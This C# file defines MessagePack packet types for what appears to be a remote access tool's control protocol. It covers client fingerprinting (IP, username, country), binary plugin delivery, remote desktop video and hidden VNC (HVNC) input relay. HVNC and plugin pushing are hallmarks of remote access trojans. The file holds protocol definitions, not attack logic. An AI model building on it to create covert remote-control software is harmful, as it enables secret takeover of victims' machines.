using Common.Communication;
using MessagePack;
using System.Buffers;

namespace Common.DTOs.MessagePack
{
    [Union(0, typeof(PingDTO))]
    [Union(1, typeof(ClientInfoDTO))]
    [Union(2, typeof(RemoteDesktopDTO))]
    [Union(3, typeof(PluginDTO))]
    [Union(4, typeof(HVNCDTO))]
    public interface IPacket
    {
        public Task HandlePacket(Session packetHandler);
    }

    [MessagePackObject]
    public class PingDTO : IPacket
    {
        public async Task HandlePacket(Session session)
        {
            session.OnPing.Invoke(this, EventArgs.Empty);
        }
    }

    [MessagePackObject]
    public class RemoteDesktopDTO : IPacket
    {
        [Key(0)]
        public byte[] VideoChunk { get; set; }
        [Key(1)]
        public string[] Options {  get; set; }
        [Key(2)]
        public Dictionary<string, byte[]> LibAVFiles { get; set; }

        public async Task HandlePacket(Session session)
        {
            session.OnRemoteDesktop(this, EventArgs.Empty);
        }
    }

    [MessagePackObject]
    public class ClientInfoDTO : IPacket
    {
        [Key(0)]
        public string Location { get; set; }
        [Key(1)]
        public string IPAddress { get; set; }
        [Key(2)]
        public string Username { get; set; }
        [Key(3)]
        public string OS { get; set; }
        [Key(4)]
        public string Ping { get; set; }
        [Key(5)]
        public string Version { get; set; }
        [Key(6)]
        public string Date { get; set; }
        [Key(7)]
        public string Country {  get; set; }

        public async Task HandlePacket(Session session)
        {
            session.OnClientInfo.Invoke(this, EventArgs.Empty);
        }
    }

    [MessagePackObject]
    public class PluginDTO : IPacket
    {
        [Key(0)]
        public byte[] Plugin { get; set; }
        [Key(1)]
        public string PluginFullName { get; set; }

        public async Task HandlePacket(Session session)
        {
            session.OnPlugin.Invoke(this, EventArgs.Empty);
        }
    }

    [MessagePackObject]
    public class HVNCDTO : IPacket
    {
        [Key(0)]
        public byte[] Frame { get; set; }
        [Key(1)]
        public string Char { get; set; }
        [Key(2)]
        public int MouseButton { get; set; }
        [Key(3)]
        public bool IsPressed { get; set; }
        [Key(4)]
        public double xFactor { get; set; }
        [Key(5)]
        public double yFactor { get; set; }
        [Key(6)]
        public int scrollDelta { get; set; }
        [Key(7)]
        public string process {  get; set; }

        public async Task HandlePacket(Session session)
        {
            session.OnHVNC.Invoke(this, EventArgs.Empty);
        }
    }
}
